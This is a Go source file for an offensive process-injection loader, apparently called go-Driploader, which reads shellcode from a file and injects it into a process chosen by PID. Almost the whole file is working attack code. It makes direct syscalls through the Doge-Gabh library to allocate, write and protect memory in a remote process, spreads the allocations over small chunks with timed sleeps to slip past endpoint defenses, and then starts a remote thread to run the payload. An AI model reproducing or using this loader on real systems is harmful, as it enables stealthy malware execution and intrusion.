package main

import (
	"fmt"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"golang.org/x/sys/windows"
	"os"
	"strconv"
	"time"
	"unsafe"
)

func inject(hProc uintptr, sc string) {
	var (
		shellcode     = ReadProcessBlob(sc)
		szSc          = uint32(len(shellcode))
		szVmResv      = alloc_gran
		szVmCmm       = page_size
		cVmResv       = (szSc / szVmResv) + 1
		cVmCmm        = szVmResv / szVmCmm
		vmBaseAddress = GetSuitableBaseAddress(hProc, szVmCmm, szVmResv, cVmResv)
	)

	lpbuffer := make([]byte, 65536) // 这里可能会有bug
	for i := 0; i < int(szSc); i++ {
		lpbuffer[i] = shellcode[i]
	}

	if 0 == vmBaseAddress {
		fmt.Println("[-] Unable to find a suitable address")
		os.Exit(0)
	}

	var (
		cmm_i         uint32
		vcVmResv      []uintptr
		currentVmBase = vmBaseAddress
	)

	var i uint32
	for i = 1; i <= cVmResv; i++ {
		time.Sleep(110 * time.Millisecond)
		// NTAllocateVirtualMemory(hProc, &currentVmBase, 0, &szVmResv, windows.MEM_RESERVE, windows.PAGE_NOACCESS, )
		gabh.HgSyscall(
			NtAllocateVirtualMemorySysid,
			hProc,
			uintptr(unsafe.Pointer(&currentVmBase)),
			0,
			uintptr(unsafe.Pointer(&szVmResv)),
			windows.MEM_RESERVE,
			windows.PAGE_NOACCESS,
		)
		vcVmResv = append(vcVmResv, currentVmBase)
		currentVmBase = currentVmBase + uintptr(szVmResv)
	}

	var (
		offsetSc  uintptr
		oldProt   uintptr
		szWritten uintptr
	)

	for i = 0; i < cVmResv; i++ {
		for cmm_i = 0; cmm_i < cVmCmm; cmm_i++ {
			var offset = cmm_i * szVmCmm
			currentVmBase = vcVmResv[i] + uintptr(offset)

			// NTAllocateVirtualMemory(hProc, &currentVmBase, 0, &szVmResv, windows.MEM_COMMIT, windows.PAGE_READWRITE, )
			gabh.HgSyscall(
				NtAllocateVirtualMemorySysid,
				hProc,
				uintptr(unsafe.Pointer(&currentVmBase)),
				0,
				uintptr(unsafe.Pointer(&szVmResv)),
				windows.MEM_COMMIT,
				windows.PAGE_READWRITE,
			)
			time.Sleep(120 * time.Millisecond)

			// NTWriteVirtualMemory(hProc, currentVmBase, &lpbuffer[offsetSc], uintptr(szVmCmm), &szWritten, )
			gabh.HgSyscall(
				NtWriteVirtualMemorySysid,
				hProc,
				currentVmBase,
				uintptr(unsafe.Pointer(&lpbuffer[offsetSc])),
				uintptr(szVmCmm),
				uintptr(unsafe.Pointer(&szWritten)),
			)
			time.Sleep(115 * time.Millisecond)

			offsetSc += uintptr(szVmCmm)

			// NTProtectVirtualMemory(hProc, &currentVmBase, &szVmResv, windows.PAGE_EXECUTE_READ, &oldProt, )
			gabh.HgSyscall(
				NtProtectVirtualMemorySysid,
				hProc,
				uintptr(unsafe.Pointer(&currentVmBase)),
				uintptr(unsafe.Pointer(&szVmResv)),
				windows.PAGE_EXECUTE_READ,
				uintptr(unsafe.Pointer(&oldProt)),
			)
		}
	}
	time.Sleep(112 * time.Millisecond)
	entry := PreEntry(windows.Handle(hProc), vmBaseAddress)
	var hThread uintptr
	// NTCreateThreadEx(&hThread, windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF, 0, hProc,entry, 0, uintptr(0), 0, 0, 0, 0, )
	gabh.HgSyscall(
		NtCreateThreadExSysid,
		uintptr(unsafe.Pointer(&hThread)),
		windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF,
		0,
		hProc,
		entry,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
	)
	time.Sleep(112 * time.Millisecond)
	windows.WaitForSingleObject(windows.Handle(hThread), 0xffffffff)
}

func main() {
	if !is64bit() {
		println("[*] Only x64 support")
		os.Exit(0)
	}

	if len(os.Args) != 3 {
		println("[*] Usage: go-Driploader.exe [pid] [scfile]")
		os.Exit(0)
	}
	pid, _ := strconv.Atoi(os.Args[1])

	/*
		// 查找指定进程的pid进行注入
		processList, err := ps.Processes()
		if err != nil {
			return
		}
		var pid int
		for _, process := range processList {
			if process.Executable() == "notepad.exe" {
				pid = process.Pid()
				break
			}
		}
	*/

	hProc, _ := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false,
		uint32(pid),
	)

	inject(uintptr(hProc), os.Args[2])
}
